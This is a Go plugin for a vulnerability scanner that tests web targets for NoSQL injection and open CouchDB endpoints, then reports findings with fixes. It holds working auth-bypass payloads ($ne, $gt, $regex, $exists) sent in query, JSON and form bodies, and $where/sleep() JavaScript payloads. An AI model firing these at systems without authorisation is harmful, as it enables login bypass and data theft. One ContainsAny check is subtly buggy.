package plugins

import (
	"DORM/models"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ==================================================
// NoSQL INJECTION — v2.0 "Mongo Mayhem"
// $ne · JSON Body · $where RCE · $regex Leak
// CouchDB probe · Spider POST integration
// ==================================================
type NoSQLPlugin struct{}

func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (Mongo Mayhem v2)" }

func (p *NoSQLPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	endpoints := []string{"/login", "/api/users", "/search", "/products", "/api/find", "/", "/api/login", "/auth"}
	params := []string{"user", "username", "u", "search", "q", "id", "token", "code", "password", "email"}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 1 — GET $ne Operator (existing logic, optimized)
	// ══════════════════════════════════════════════════════════════════════
	for _, ep := range endpoints {
		for _, param := range params {
			targetURL := baseURL + ep

			// Baseline
			reqBase, _ := http.NewRequest("GET", targetURL, nil)
			qBase := reqBase.URL.Query()
			qBase.Add(param, "dorm_random_value_9999")
			reqBase.URL.RawQuery = qBase.Encode()
			respBase, err := client.Do(reqBase)
			if err != nil {
				continue
			}
			bodyBase, _ := io.ReadAll(io.LimitReader(respBase.Body, 65536))
			respBase.Body.Close()
			lenBase := len(bodyBase)
			codeBase := respBase.StatusCode

			// $ne attack
			attackQuery := fmt.Sprintf("%s[$ne]=dorm_random_value_9999", param)
			fullAttackURL := fmt.Sprintf("%s?%s", targetURL, attackQuery)
			reqAttack, _ := http.NewRequest("GET", fullAttackURL, nil)
			respAttack, err := client.Do(reqAttack)
			if err != nil {
				continue
			}
			bodyAttack, _ := io.ReadAll(io.LimitReader(respAttack.Body, 65536))
			respAttack.Body.Close()
			lenAttack := len(bodyAttack)
			codeAttack := respAttack.StatusCode

			if codeBase != 200 && codeAttack == 200 {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection (Operator: $ne — Auth Bypass)",
					Severity: "HIGH",
					CVSS:     8.2,
					Description: fmt.Sprintf(
						"Authentication bypassed with MongoDB '$ne' operator.\nParam: %s\nBaseline: HTTP %d → Attack: HTTP %d",
						param, codeBase, codeAttack,
					),
					Solution:  "Enforce user inputs as string instead of object. Implement input type validation.",
					Reference: "OWASP NoSQL Injection / CWE-943",
				}
			}

			if lenAttack > (lenBase + 200) {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection ($ne Data Leak)",
					Severity: "HIGH",
					CVSS:     7.5,
					Description: fmt.Sprintf(
						"Response size increased significantly with '$ne' operator — data leak detected.\nParam: %s\nBaseline: %d bytes → Attack: %d bytes",
						param, lenBase, lenAttack,
					),
					Solution:  "Implement input type validation. Filter operator injections.",
					Reference: "CWE-943: Improper Neutralization in Data Query Logic",
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 2 — JSON Body Injection (POST application/json)
	// ══════════════════════════════════════════════════════════════════════
	jsonPayloads := []struct {
		Body string
		Desc string
	}{
		{
			`{"username": {"$gt": ""}, "password": {"$gt": ""}}`,
			"$gt (greater-than) matches all records",
		},
		{
			`{"username": {"$ne": null}, "password": {"$ne": null}}`,
			"$ne null matches all non-null records",
		},
		{
			`{"username": {"$exists": true}, "password": {"$exists": true}}`,
			"$exists field existence bypass",
		},
		{
			`{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}`,
			"$regex wildcard matches all users",
		},
	}

	postEndpoints := []string{"/login", "/api/login", "/auth", "/api/auth", "/user/login", "/signin"}

	for _, ep := range postEndpoints {
		targetURL := baseURL + ep

		// Baseline (invalid credentials)
		baseBody := bytes.NewReader([]byte(`{"username": "invalid_dorm_x9", "password": "invalid_dorm_x9"}`))
		baseResp, err := client.Post(targetURL, "application/json", baseBody)
		if err != nil {
			continue
		}
		baseBytes, _ := io.ReadAll(io.LimitReader(baseResp.Body, 65536))
		baseResp.Body.Close()
		baseCode := baseResp.StatusCode
		baseLen := len(baseBytes)

		for _, pl := range jsonPayloads {
			attackBody := bytes.NewReader([]byte(pl.Body))
			resp, err := client.Post(targetURL, "application/json", attackBody)
			if err != nil {
				continue
			}
			respBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
			resp.Body.Close()
			attackCode := resp.StatusCode
			attackLen := len(respBytes)

			if (baseCode != 200 && attackCode == 200) || (attackLen > baseLen+100) {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection (JSON Body — Auth Bypass)",
					Severity: "CRITICAL",
					CVSS:     9.1,
					Description: fmt.Sprintf(
						"Authentication bypassed via NoSQL injection in JSON body.\nEndpoint: %s\nTechnique: %s\nPayload: %s\nBaseline: HTTP %d (%d bytes) → Attack: HTTP %d (%d bytes)",
						targetURL, pl.Desc, pl.Body, baseCode, baseLen, attackCode, attackLen,
					),
					Solution:  "Enforce all fields in JSON body as strings. Whitelist/block MongoDB operators ($gt, $ne, $regex).",
					Reference: "OWASP NoSQL Injection / CWE-943",
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 3 — POST Form Injection (user[$ne]=x)
	// ══════════════════════════════════════════════════════════════════════
	formEndpoints := []string{"/login", "/api/login", "/auth", "/signin"}
	formParams := []string{"username", "user", "email", "password", "pass"}

	for _, ep := range formEndpoints {
		targetURL := baseURL + ep
		for _, param := range formParams {
			// Baseline
			baseData := url.Values{}
			baseData.Set("username", "invalid_user_x9")
			baseData.Set("password", "invalid_pass_x9")
			baseReq, _ := http.NewRequest("POST", targetURL, strings.NewReader(baseData.Encode()))
			baseReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			baseResp, err := client.Do(baseReq)
			if err != nil {
				continue
			}
			baseResp.Body.Close()
			baseCode := baseResp.StatusCode

			// Attack: user[$ne]=invalid_dorm
			attackData := url.Values{}
			attackData.Set(param+"[$ne]", "invalid_dorm_x9")
			attackData.Set("password[$ne]", "invalid_dorm_x9")
			attackReq, _ := http.NewRequest("POST", targetURL, strings.NewReader(attackData.Encode()))
			attackReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			attackResp, err := client.Do(attackReq)
			if err != nil {
				continue
			}
			attackResp.Body.Close()
			attackCode := attackResp.StatusCode

			if baseCode != 200 && attackCode == 200 {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection (POST Form — $ne Operator)",
					Severity: "CRITICAL",
					CVSS:     9.1,
					Description: fmt.Sprintf(
						"Auth bypass via '$ne' operator in form-encoded POST body.\nEndpoint: %s\nPayload: %s[$ne]=invalid_dorm_x9",
						targetURL, param,
					),
					Solution:  "Validate input types server-side; use `is_string()` in PHP, `typeof` in Node.js.",
					Reference: "OWASP NoSQL Injection",
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 4 — $where JavaScript Time-Based
	// ══════════════════════════════════════════════════════════════════════
	wherePayloads := []string{
		`{"$where": "sleep(5000)"}`,
		`{"$where": "function() { sleep(5000); return true; }"}`,
	}

	for _, ep := range postEndpoints {
		targetURL := baseURL + ep

		// Baseline latency
		baseStart := time.Now()
		baseResp, err := client.Post(targetURL, "application/json",
			bytes.NewReader([]byte(`{"username": "dorm_test", "password": "dorm_test"}`)))
		baseElapsed := time.Since(baseStart)
		if err != nil {
			continue
		}
		baseResp.Body.Close()

		for _, payload := range wherePayloads {
			attackStart := time.Now()
			resp, err := client.Post(targetURL, "application/json", bytes.NewReader([]byte(payload)))
			attackElapsed := time.Since(attackStart)
			if err != nil {
				continue
			}
			resp.Body.Close()

			// Attack must be at least 4 seconds longer than baseline
			if attackElapsed > baseElapsed+4*time.Second {
				return &models.Vulnerability{
					Target:   target,
					Name:     "NoSQL Injection ($where JavaScript RCE — Time-Based)",
					Severity: "CRITICAL",
					CVSS:     9.8,
					Description: fmt.Sprintf(
						"JavaScript executed inside MongoDB via $where operator (Time-Based validation).\nEndpoint: %s\nPayload: %s\nBaseline: %.2fs → Attack: %.2fs (diff: %.2fs)",
						targetURL, payload, baseElapsed.Seconds(), attackElapsed.Seconds(), (attackElapsed - baseElapsed).Seconds(),
					),
					Solution:  "Disable server-side JavaScript in MongoDB (--noscript). Block the $where operator.",
					Reference: "CWE-943 / OWASP NoSQL Injection",
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 5 — $regex Data Leak Detection
	// ══════════════════════════════════════════════════════════════════════
	regexPayload := `{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}`

	for _, ep := range postEndpoints {
		targetURL := baseURL + ep

		baseResp, err := client.Post(targetURL, "application/json",
			bytes.NewReader([]byte(`{"username": "invalid_x9999", "password": "invalid_x9999"}`)))
		if err != nil {
			continue
		}
		baseBytes, _ := io.ReadAll(io.LimitReader(baseResp.Body, 65536))
		baseResp.Body.Close()

		regexResp, err := client.Post(targetURL, "application/json", bytes.NewReader([]byte(regexPayload)))
		if err != nil {
			continue
		}
		regexBytes, _ := io.ReadAll(io.LimitReader(regexResp.Body, 65536))
		regexResp.Body.Close()

		if len(regexBytes) > len(baseBytes)+150 {
			return &models.Vulnerability{
				Target:   target,
				Name:     "NoSQL Injection ($regex Data Leak)",
				Severity: "HIGH",
				CVSS:     7.5,
				Description: fmt.Sprintf(
					"Response size increased significantly with $regex wildcard operator — data leak confirmed.\nEndpoint: %s\nBaseline: %d bytes → Regex Attack: %d bytes",
					targetURL, len(baseBytes), len(regexBytes),
				),
				Solution:  "Block MongoDB operators ($regex, $where, $gt) in JSON input or use whitelisting.",
				Reference: "OWASP NoSQL Injection / CWE-943",
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 6 — Time-Based Boolean (existing, optimized)
	// ══════════════════════════════════════════════════════════════════════
	timePayloadsList := []string{
		`';sleep(5000);var a='`,
		`0;sleep(5000)`,
	}

	for _, ep := range endpoints {
		for _, param := range params {
			targetURL := baseURL + ep
			qs := url.Values{}

			// Baseline
			qs.Set(param, "dorm_safe_value")
			baseStart := time.Now()
			baseR, err := client.Get(fmt.Sprintf("%s?%s", targetURL, qs.Encode()))
			baseElapsed := time.Since(baseStart)
			if err != nil {
				continue
			}
			baseR.Body.Close()

			for _, tp := range timePayloadsList {
				qs.Set(param, tp)
				attackURL := fmt.Sprintf("%s?%s", targetURL, qs.Encode())
				start := time.Now()
				resp, err := client.Get(attackURL)
				elapsed := time.Since(start)
				if err == nil {
					resp.Body.Close()
				}
				if elapsed > baseElapsed+4*time.Second {
					return &models.Vulnerability{
						Target:   target,
						Name:     "Blind NoSQL Injection (Time-Based JavaScript)",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: fmt.Sprintf(
							"Server delayed by %s via JavaScript sleep() payload — NoSQL/MongoDB JS execution confirmed.\nParam: %s\nPayload: %s",
							elapsed.Round(time.Millisecond), param, tp,
						),
						Solution:  "Use --noscript flag in MongoDB and validate all user inputs.",
						Reference: "CWE-943 / OWASP Injection",
					}
				}
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 7 — CouchDB Unauthorized Access Probe
	// ══════════════════════════════════════════════════════════════════════
	couchEndpoints := []string{"/_users", "/_all_docs", "/_config", "/_utils"}
	for _, ep := range couchEndpoints {
		resp, err := client.Get(baseURL + ep)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()
		bodyStr := string(body)

		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "rows") || strings.Contains(bodyStr, "total_rows") || strings.Contains(bodyStr, "couchdb")) {
			return &models.Vulnerability{
				Target:   target,
				Name:     "CouchDB Unauthorized Access",
				Severity: "HIGH",
				CVSS:     8.0,
				Description: fmt.Sprintf(
					"CouchDB management endpoint is accessible without authentication.\nEndpoint: %s\nResponse: HTTP %d",
					baseURL+ep, resp.StatusCode,
				),
				Solution:  "Configure CouchDB with require_valid_user=true and create an admin account.",
				Reference: "CWE-306: Missing Authentication for Critical Function",
			}
		}
	}

	// ══════════════════════════════════════════════════════════════════════
	// PHASE 8 — Spider POST Integration
	// ══════════════════════════════════════════════════════════════════════
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "POST" {
				for _, pl := range jsonPayloads[:2] {
					resp, err := client.Post(ep.URL, "application/json", bytes.NewReader([]byte(pl.Body)))
					if err != nil {
						continue
					}
					body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
					resp.Body.Close()

					if resp.StatusCode == 200 && strings.ContainsAny(string(body), "token session user admin") {
						return &models.Vulnerability{
							Target:   target,
							Name:     "NoSQL Injection (Spider-Discovered POST Endpoint)",
							Severity: "CRITICAL",
							CVSS:     9.1,
							Description: fmt.Sprintf(
								"JSON NoSQL injection succeeded on spider-discovered POST endpoint.\nURL: %s\nPayload: %s",
								ep.URL, pl.Body,
							),
							Solution:  "Filter MongoDB operators in all JSON inputs.",
							Reference: "OWASP NoSQL Injection",
						}
					}
				}
			}
		}
	}

	return nil
}
